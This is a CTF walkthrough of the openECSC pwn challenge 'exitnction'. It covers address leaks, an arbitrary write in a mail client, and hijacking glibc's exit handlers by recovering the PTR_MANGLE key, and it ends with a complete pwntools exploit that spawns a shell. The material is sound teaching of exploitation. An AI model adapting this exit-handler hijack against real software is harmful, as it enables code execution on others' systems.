---
title: exitnction - openECSC - Walkthrough
date: 2025-10-05 10:00:00 +0200
categories: [openECSC,pwn]
tags: [pwn,exit,pwntools,openECSC,libc]
description: Exploit exit to get system.
image:
  path: /assets/blog/exitnction/Logo.png
  alt: openECSC Logo
---


## Introduction

This is one of the **pwn** challenges of the openECSC (Open European Cybersecurity Challenge) competition. The challenge was made by `mantix101`. It starts with the following description and a file containing the challenge (`exitnction.tar.gz`). The challenge was rated as medium and 37 people solved it.

> From: security@exitnction.ctf
>
> To: pwn@exitnction.ctf
> 
> Subject: Scheduled Security Test for Mail Application
> 
> Date: Tue, 21 September 2025 13:37:00 +0200
> 
> MIME-Version: 1.0
> 
> Content-Type: text/plain; charset="UTF-8"
> 
> 
> Hello Team,
> 
> As discussed, we have scheduled a full-scale security test on the mail application currently in use. This particular application has been identified as the same platform exploited during the recent compromise of our multi-billion dollar corporation: Exitnction Limited, and we need to validate its security posture before allowing any further internal usage.
> 
> Our goal is to determine whether vulnerabilities still exist in our deployment. If any signs of exploitation surface or previously undocumented behavior is detected, the affected systems will be isolated immediately and a detailed follow-up assessment will be conducted.
> 
> Please ensure that all relevant services and logging aggregators remain operational during the test window and that no configuration changes are introduced until the testing phase is complete.
> 
> Let me know if you have any questions or concerns.
> 
> Best regards,
> 
> Security Team - Exitnction **Limited**


The challenge file (`exitnction.tar.gz`) contains these files:
```terminal
$ ls
Dockerfile  docker-compose.yml	exitnction  flag.txt
```

The `Dockerfile` basically contains the setup which is based on a Ubuntu 24.04 docker container. Alternatively, the `docker-compose.yml` file also lets you build the container just by running the docker-compose command.

I tried running the executable `exitnction` on my machine, this didn't work, so to continue it is necessary to find the right `libc`, because my machine is missing/not matching that version of `libc`.

```terminal
$ ./exitnction
./exitnction: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.38' not found (required by ./exitnction)
```

## Finding `libc` & Patching the Binary
So next I pulled the docker container given in the `Dockerfile` and run it. The docker image used for building the container is matched with a exact hash, which will make it easier to find the exact `libc` version of the server.

```terminal
$ docker run -it --rm -v $(pwd):/host amd64/ubuntu@sha256:c115bab85a806837279e12a28e1c05260e8899160224b323743493bcd65463dc /bin/bash
```

To use the `libc` on my machine I copied the it to my current challenge directory.

```terminal
root@6935fe4e99ae:/# cp /lib/x86_64-linux-gnu/libc.so.6 /host
```

After having all the necessary parts to continue I used [`pwninit`](https://github.com/io12/pwninit) to setup the linker simply by running:
```terminal
$ pwninit
```

This tool is very helpful because it will download the right linker and will simplify the process of debugging the binary. Also it will patch the binary to have the matching `libc` linked to it and not the default one on my machine. After running `pwninit`, I was able to run the patched binary named `exitnction_patched`.

```terminal
$ ./exitnction_patched 
Welcome to the 'Exitnction' mail client!

Exitnction Mail Client Commands:
  read          - Read emails
  write         - Write an e-mail
  server        - Print mail server information
  help          - Show this help message
  exit          - Exit


> 
```

Running the binary shows that it is a *mail client* with some basic options.

## Binary Recon

The binary is fully protected with all major mitigations enabled: **Full RELRO**, **stack canaries**, **NX**, **PIE**.

```terminal
$ checksec --file=exitnction

[*] '/home/user/Documents/openECSC2025/writeup1/exitnction/exitnction'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

At this stage it is useful to check the binaries features, the application provides three main functions: reading emails, writing emails, and retrieving server information. Lastly, it contains a help function and a exit function.

```
> server
=== Mail Server Information ===
Name: EXITNCTION
Version: 1.3.3.7
Email sending limit: 0/3
License: Trial (0x55c2566b30b0)
Backend: 2.39-stable (0x7f2317e47ba0)

> read
=== Inbox ===

Mail #1:
From: pwn@exit.ctf
Subject: Hello!
Body: Just saying hi.

....

Enter recipient email address as hex (e.g. 0x7774664065786974): 0x 1

Enter Subject (8 chars): A

Enter Body (64 chars): B
Segmentation fault
```

The help page only lists the menu of the challenge again. The next function, the server information function leaks two different addresses in different sections of the virtual memory. The read function only statically outputs some demo emails containing nothing interesting.  The `write` function lets you write to a *email address as hex*, probably a binary address, because if we enter something arbitrary a **Segmentation fault** will happen.

### Mail Server Info

The `server` which is quite important for addresses. The source code reveals that the fist address after the text `License` is actually the address of `current_license` which is a local variable, so with that we have a binary address. The second address is the address of `exit()` in `libc`, with that we have a binary and a `libc` address. Additionally the `libc` version and the release is leaked, this is not very important if we have the docker container's `libc`. 

```c

void mail_server_info(void)

{
  int iVar1;
  undefined8 uVar2;
  undefined8 uVar3;
  
  puts("=== Mail Server Information ===");
  __printf_chk(2,"Name: %s\n","EXITNCTION");
  __printf_chk(2,"Version: %s\n","1.3.3.7");
  __printf_chk(2,"Email sending limit: %d/%d\n",sent_mails,3);
  __printf_chk(2,"License: %s (%p)\n","Trial",&current_license);
  uVar2 = gnu_get_libc_release();
  uVar3 = gnu_get_libc_version();
  __printf_chk(2,"Backend: %s-%s (%p)\n",uVar3,uVar2,exit);
  iVar1 = strcmp(current_license,"DEBUG");
  if (iVar1 != 0) {
    return;
  }
  __printf_chk(2,"Internal Debug Info: %p",_r_debug._8_8_);
  return;
}
```

Lastly, if the pointer `current_license` is pointing to the string `DEBUG`, it will additionally print `_r_debug._8_8_`.

```c
__printf_chk(2,"Internal Debug Info: %p",_r_debug._8_8_);
```

This address is the second field in the `_r_debug` struct and points to the `link_map` structure. The `link_map` is a dynamic linker structure that contains information about all loaded shared objects.

### Write Email

The next interesting function is `write_email()`, which allows us to input data to arbitrary memory locations.

```c

void write_email(void)

{
  size_t sVar1;
  long lVar2;
  undefined8 **ppuVar3;
  long in_FS_OFFSET;
  undefined8 *local_78;
  char local_70;
  undefined7 uStack_6f;
  undefined4 local_67;
  undefined4 uStack_63;
  undefined4 uStack_5f;
  undefined4 uStack_5b;
  undefined4 local_57;
  undefined4 uStack_53;
  undefined4 uStack_4f;
  undefined4 uStack_4b;
  undefined4 local_47;
  undefined4 uStack_43;
  undefined4 uStack_3f;
  undefined4 uStack_3b;
  undefined4 local_37;
  undefined4 uStack_33;
  undefined4 uStack_2f;
  undefined4 uStack_2b;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  ppuVar3 = &local_78;
  for (lVar2 = 0xb; lVar2 != 0; lVar2 = lVar2 + -1) {
    *ppuVar3 = (undefined8 *)0x0;
    ppuVar3 = ppuVar3 + 1;
  }
  __printf_chk(2,"\nEnter recipient email address as hex (e.g. 0x7774664065786974): 0x");
  __isoc23_scanf(&DAT_00102021,&local_78);
  getc(stdin);
  __printf_chk(2,"\nEnter Subject (8 chars): ");
  fgets(&local_70,9,stdin);
  sVar1 = strcspn(&local_70,"\n");
  (&local_70)[sVar1] = '\0';
  __printf_chk(2,"\nEnter Body (64 chars): ");
  fgets((char *)&local_67,0x41,stdin);
  sVar1 = strcspn((char *)&local_67,"\n");
  *(undefined *)((long)&local_67 + sVar1) = 0;
  if (local_70 != '\0') {
    *local_78 = CONCAT71(uStack_6f,local_70);
  }
  if ((char)local_67 != '\0') {
    *(undefined4 *)local_78 = local_67;
    *(undefined4 *)((long)local_78 + 4) = uStack_63;
    *(undefined4 *)(local_78 + 1) = uStack_5f;
    *(undefined4 *)((long)local_78 + 0xc) = uStack_5b;
    *(undefined4 *)(local_78 + 2) = local_57;
    *(undefined4 *)((long)local_78 + 0x14) = uStack_53;
    *(undefined4 *)(local_78 + 3) = uStack_4f;
    *(undefined4 *)((long)local_78 + 0x1c) = uStack_4b;
    *(undefined4 *)(local_78 + 4) = local_47;
    *(undefined4 *)((long)local_78 + 0x24) = uStack_43;
    *(undefined4 *)(local_78 + 5) = uStack_3f;
    *(undefined4 *)((long)local_78 + 0x2c) = uStack_3b;
    *(undefined4 *)(local_78 + 6) = local_37;
    *(undefined4 *)((long)local_78 + 0x34) = uStack_33;
    *(undefined4 *)(local_78 + 7) = uStack_2f;
    *(undefined4 *)((long)local_78 + 0x3c) = uStack_2b;
  }
  sent_mails = sent_mails + 1;
  puts("\nEmail has been successfully sent to the recipient!");
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

The decompiled output from Ghidra was difficult to read, so I cleaned up with ChatGPT the code for better readability.

```c
void write_email(void) {
    uint64_t *recipient = NULL;   // Pointer to store recipient email (as hex)
    char subject[9] = {0};        // Subject (8 chars + null terminator)
    char body[65] = {0};          // Body (64 chars + null terminator)

    // Prompt for recipient email in hex
    printf("\nEnter recipient email address as hex (e.g. 0x7774664065786974): 0x");
    scanf("%p", (void **)&recipient);
    getchar(); // consume leftover newline

    // Prompt for subject
    printf("\nEnter Subject (8 chars): ");
    fgets(subject, sizeof(subject), stdin);
    subject[strcspn(subject, "\n")] = '\0'; // Remove newline if present

    // Prompt for body
    printf("\nEnter Body (64 chars): ");
    fgets(body, sizeof(body), stdin);
    body[strcspn(body, "\n")] = '\0'; // Remove newline if present

    if (recipient != NULL) {
        if (subject[0] != '\0') {
            *(uint64_t *)recipient = *(uint64_t *)subject; // Copy first 8 bytes of subject
        }

        if (body[0] != '\0') {
            memcpy(recipient, body, sizeof(body) - 1); // Copy body (up to 64 bytes)
        }
    }

    // Increment sent emails counter
    sent_mails++;

    printf("\nEmail has been successfully sent to the recipient!\n");
}
```

The function first prompts the user to enter a memory address in hex format, then requests the email's subject and body. It writes this content directly to the specified address, providing an arbitrary write primitive.

This arbitrary write capability allows us to modify `current_license`. By changing the license from `Trial` to `DEBUG`, we gain access to an additional address leak. This can be done because the string `DEBUG` is already present in the binary and the leaked addresses and can be used to change the `current_license` to the string. 

## Reading Emails

The final interesting function is `read_emails()`, which is responsible for reading emails. This function allows us to read arbitrary strings longer than 8 bytes. The function checks the length of the buffer using a `while-do` structure and if not jumped it will continue printing the license.

By overwriting the pointer `current_license` with an address containing more than 8 non-null bytes, we can leak that memory content.

```c

void read_emails(void)

{
  long lVar1;
  char *pcVar2;
  ulong uVar3;
  ulong uVar4;
  
  pcVar2 = current_license;
  do {
    if (*pcVar2 == '\0') goto LAB_001014ce;
    pcVar2 = pcVar2 + 1;
  } while (pcVar2 != current_license + 8);
  __printf_chk(2,"Your current license is \'%s\'.\n",current_license);
LAB_001014ce:
  uVar4 = 1;
  puts("=== Inbox ===");
  do {
    lVar1 = uVar4 * 8;
    uVar3 = uVar4 & 0xffffffff;
    uVar4 = uVar4 + 1;
    __printf_chk(2,"\nMail #%d:\n%s\n",uVar3,*(undefined8 *)(&DAT_00104018 + lVar1));
  } while (uVar4 != 4);
  return;
}
```

At this point, we have achieved the following primitives and achievements:

- **Leaked** several **addresses** from different memory sections
- **Arbitrary read**: We can read almost any string longer than 8 bytes
- **Arbitrary write**: We can write to any writable memory section

## Methodology

**Initial**
Although we can write anywhere in memory, we still face the challenge of achieving code execution. We can't simply pivot to a ROP chain on the stack because we don't have a stack address.

My initial approach was to leak a stack address from `libc`, since `libc` typically contains stack pointers. ~~While I successfully found a stack address in `libc`, it proved too unstable across runs to be reliable for exploitation.~~

There is a way of exploiting this by leaking `libc`'s `environ` variable. With this address you will get a stable offset on the stack to overwrite a return pointer.

**Exit Strategy**

Given that the challenge is named "exitnction" and we actually trigger the exit routine, I decided to investigate `libc`'s exit functionality. Here is the section in main which calls `exit()`. 

```c
        if ((local_3a == 0x74697865) && (local_36 == '\0')) {
                    /* WARNING: Subroutine does not return */
          exit(0);
```

I firstly found this article <https://blog.rop.la/en/exploiting/2024/06/11/code-exec-part1-from-exit-to-system.html>, and then invested some time looking in the source code.

## Exit Handlers

When calling `libc`'s `exit()` function, the following sequence is executed:

```c
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
```

The `exit()` function calls `__run_exit_handlers()` to process the registered exit handlers. The source code is quite good documented so it was easy to understand what happens.

```c
/* Call all functions registered with `atexit' and `on_exit',
   in the reverse of the order in which they were registered
   perform stdio cleanup, and terminate program execution with STATUS.  */
void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit)
{
  /* First, call the TLS destructors.  */
#ifndef SHARED
  if (&__call_tls_dtors != NULL)
#endif
    __call_tls_dtors ();

  /* We do it this way to handle recursive calls to exit () made by
     the functions registered with `atexit' and `on_exit'. We call
     everyone on the list and use the status value in the last
     exit (). */
  while (*listp != NULL)
    {
      struct exit_function_list *cur = *listp;

      while (cur->idx > 0)
	{
	  const struct exit_function *const f =
	    &cur->fns[--cur->idx];
	  switch (f->flavor)
	    {
	      void (*atfct) (void);
	      void (*onfct) (int status, void *arg);
	      void (*cxafct) (void *arg, int status);

	    case ef_free:
	    case ef_us:
	      break;
	    case ef_on:
	      onfct = f->func.on.fn;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (onfct);
#endif
	      onfct (status, f->func.on.arg);
	      break;
	    case ef_at:
	      atfct = f->func.at;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (atfct);
#endif
	      atfct ();
	      break;
	    case ef_cxa:
	      cxafct = f->func.cxa.fn;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (cxafct);
#endif
	      cxafct (f->func.cxa.arg, status);
	      break;
	    }
	}

      *listp = cur->next;
      if (*listp != NULL)
	/* Don't free the last element in the chain, this is the statically
	   allocate element.  */
	free (cur);
    }

  if (run_list_atexit)
    RUN_HOOK (__libc_atexit, ());

  _exit (status);
}
```
> <https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/exit.c#L36>

This function executes handlers that were registered to run on exit using `atexit()` and `on_exit()`. It processes the exit function list in reverse order of registration, calling each handler based on its flavor type:

- **`ef_at`**: Standard `atexit()` handlers (no arguments)
- **`ef_on`**: `on_exit()` handlers (takes status and argument)
- **`ef_cxa`**: `__cxa_atexit()` handlers (takes argument and status)

The function first calls TLS destructors, then iterates through the exit function list, calling each registered handler with pointer demangling applied for security. After all handlers complete, it performs final cleanup and calls `_exit()` with the provided status code.


## Memory storing the pointers & arguments

These handlers are stored in the `exit_function_list` of `initial`, which contains a list of exit function entries. Each entry includes a flavor field that indicates the handler type (e.g., `atexit`, `on_exit` or basically what type of exit function it is, e.g. with/out argument) and a function pointer and sometimes with the associated arguments.


```terminal
pwndbg> p initial
 next = 0x0,
 idx = 1,
 fns = {
   {
     flavor = 4,
     func = {
       at = 0xe5fe92114a4c86b1,
       on = {
         fn = 0xe5fe92114a4c86b1,
         arg = 0x7fc1211cb42f
       },
       cxa = {
         fn = 0xe5fe92114a4c86b1,
         arg = 0x7fc1211cb42f,
         dso_handle = 0x0
       }
     }
   }
 }
```

The value `0xe5fe92114a4c86b1` is the encrypted function pointer, the first argument `0x7fc1211cb42f` is stored unencrypted. After the encrypted function pointer.

```
pwndbg> x/10gx &initial
0x7fc121204fc0 <initial>:       0x0000000000000000      0x0000000000000001
0x7fc121204fd0 <initial+16>:    0x0000000000000004      0xe5fe92114a4c86b1
0x7fc121204fe0 <initial+32>:    0x00007fc1211cb42f      0x0000000000000000
```
> This actually is the buffer modified after chainging the addresses `0x7fc1211cb42f` is `/bin/sh` and `0xe5fe92114a4c86b1` is the encrypted system pointer.

There are several different flavors of exit functions stored. A flavor just describes how a function is stored, for ex. with an argument...

```c
  enum {
    ef_free,        // slot unused
    ef_at,          // atexit(function)
    ef_on,          // on_exit(function, arg)
    ef_cxa,         // __cxa_atexit(fn, arg, dso_handle)
  } flavor
```

The original flavor `0x4` is quite useful for us. We can simply use that address without needing to write a different number for the flavor parameter, since `ef_cxa` works for our purposes as well. The original function pointer is pointing to `_dl_fini` which is a funciton in the linker. Fortunately we already have an address in the linker so finding the matching offset is not necessary.

## Pointer Encryption via `PTR_MANGLE`

The encryption of the function pointer referencing the exit handler is performed using the `PTR_MANGLE` mechanism, which implements a simple bitwise rotation combined with an XOR operation:

- **Decryption**: Right rotation (ROR) of `0x11` bits followed by XOR
- **Encryption**: XOR followed by left rotation (ROL) of `0x11` bits

### Decryption Process

The following assembly demonstrates the decryption operation in the `__run_exit_handlers` function:

```
0x7feba2447a56 <__run_exit_handlers+326> ror rax, 0x11
0x7feba2447a5a <__run_exit_handlers+330> xor rax, qword ptr fs:[0x30]
```

The key used for XOR is stored in the [fs-segment](https://docs.kernel.org/arch/x86/x86_64/fsgs.html#common-fs-and-gs-usage) used for Thread Local Storage (TLS).

## Exploitation Plan

With that I was able to do a exploitation plan:

1. **Leak/Retrieve the address** of the `mail_server_info` function

2. **Modify the `current_license` pointer** to point to the `DEBUG` buffer, which is conveniently already present in the binary

3. **Write the `/bin/sh` string** as the first argument below the encrypted function pointer. This step must be performed first; otherwise, we cannot read the encrypted function pointer because it is smaller than 9 bytes (its 8 bytes because  of encryption)

4. **Leak the encrypted pointer** by modifying the `current_license` pointer again

5. **Extract the function pointer encryption key** using the known original function address. Since we have the base address of the loader and the offset is static, we can determine key using the reverse operation of the encryption.

6. **Overwrite the encrypted function pointer** with a new function pointer pointing to `system`. We can encrypt this correctly because we obtained the encryption key through the previously leaked address

7. **Trigger the exploit** by exiting, which calls the overwritten function pointer with `/bin/sh` as the argument

### Key Observations

- The `DEBUG` buffer is already present in the binary, making it accessible for pointer manipulation
- The loader's base address combined with the static offset allows us to calculate the original function address
- Knowledge of both the plaintext and ciphertext function pointers reveals the encryption key
- This key can then be used to encrypt our malicious `system` pointer

## Full exploit code
Here is the full exploit code.

```python
from pwn import *
import re
import time

context.binary = elf = ELF("./exitnction_patched")
context.arch = 'amd64'

ld = ELF("./ld-2.39.so")

p = process([elf.path])
# p = remote("bb5489ea-a655-4205-89ad-8a47f1363e5e.openec.sc",31337,ssl=True)

libc = elf.libc


def rol64(x, r): return ((x << r) | (x >> (64-r))) & ((1<<64)-1)
def ror64(x, r): return ((x >> r) | (x << (64-r))) & ((1<<64)-1)

def get_xor_key(observed, original):
    if isinstance(observed, str): observed = int(observed, 16)
    if isinstance(original, str): original = int(original, 16)

    original = ror64(original, 0x11)

    return observed ^ original


def get_addresses(p):
    p.sendlineafter(b'> ', b'server')
    
    output = p.recvuntil(b'> ', drop=True).decode()
    
    license_match = re.search(r'License: Trial \((0x[0-9a-f]+)\)', output)
    license_addr = int(license_match.group(1), 16) if license_match else None
    
    backend_match = re.search(r'Backend: [\d.]+-stable \((0x[0-9a-f]+)\)', output)
    backend_addr = int(backend_match.group(1), 16) if backend_match else None
    
    return {
        'license': license_addr,
        'backend': backend_addr
    }


def write_email(p, recipient_addr, body):
    p.sendlineafter(b'> ', b'write')

    p.sendlineafter(b'0x', hex(recipient_addr)[2:].encode())
    p.sendlineafter(b'Enter Subject (8 chars): ', body[:8])
    p.sendlineafter(b'Enter Body (64 chars): ', body[8:])

def leak_addresses_and_setup(proc):
    addrs = get_addresses(proc)

    libc.address = addrs['backend'] - libc.symbols['exit']
    log.info(f"Leaked libc base: {hex(libc.address)}")

    license_addr = addrs['license']
    elf.address = license_addr - 16560
    log.info(f"Leaked elf base address: {hex(elf.address)}")

    proc.sendline(b"help")
    time.sleep(0.5)
    log.info(f"Leaked the addresses of libc and the binary")
    return addrs

def debug_addr(addrs):
    license_addr = addrs['license']
    debug_addr = license_addr - 8151
    return debug_addr

def leak_debug_address(proc, addrs, debug_addr):
    license_addr = addrs["license"]
    payload_debug = p64(debug_addr)
    
    write_email(proc, license_addr, payload_debug)
    
    proc.sendlineafter(b'> ', b'server')
    output = proc.recvuntil(b'> ', drop=True).decode()
    proc.sendline(b"help")
    
    time.sleep(0.5)
    m = re.search(r'Internal Debug Info: (0x[a-f0-9]+)', output)
    if not m:
        raise RuntimeError("failed to find Internal Debug Info in server output")
    r_debug_8 = int(m.group(1), 16)
    ld.address = r_debug_8 - 234208

    log.info(f"Debug address leaked: {hex(r_debug_8)} by overwriting the license")
    log.info(f"Got loader base address: {hex(ld.address)}")
    return r_debug_8

def write_bin_sh_into_struct():
    initial_addr = libc.symbols["initial"]
    
    log.info(f"Found initial address: {hex(initial_addr)}")
    
    destination = initial_addr + 0x20
    bin_sh = next(libc.search(b"/bin/sh"))

    write_email(p, destination, p64(bin_sh))
    
    return initial_addr

def overwrite_initial_pointer_and_extract_key(initial_addr, license_addr):
    write_email(p, license_addr, p64(initial_addr + 0x18))
    
    p.sendlineafter(b'> ', b'read')
    p.recvuntil(b"Your current license is '")
    
    encrypted_bytes = p.recv(numb=8)
    encrypted_dl_fini = u64(encrypted_bytes)
    dl_fini = ld.address + 21376
    
    key = get_xor_key(dl_fini, encrypted_dl_fini)
    log.info(f"exit_functions key: {hex(key)}")
    
    return key

def encrypt_system_and_write(initial_addr, key):
    encrypted_system = rol64(libc.symbols["system"] ^ key, 0x11)
    
    write_email(p, initial_addr + 0x18, p64(encrypted_system))

def main():
    addrs = leak_addresses_and_setup(p)
    debug_addr_val = debug_addr(addrs)

    leak_debug_address(p, addrs, debug_addr_val)
    
    
    initial_addr = write_bin_sh_into_struct()
    key = overwrite_initial_pointer_and_extract_key(initial_addr, addrs["license"])
    
    encrypt_system_and_write(initial_addr, key)
    
    p.sendlineafter(b"> ",b"exit")
    p.clean()
    p.sendline(b"cat flag.txt")
    p.interactive()

if __name__ == "__main__":
    main()
```

## Conclusion

This challenge demonstrated an interesting exploitation path for memory corruption vulnerabilities. I was originally inspired by this technique after reading the `libc` source code and .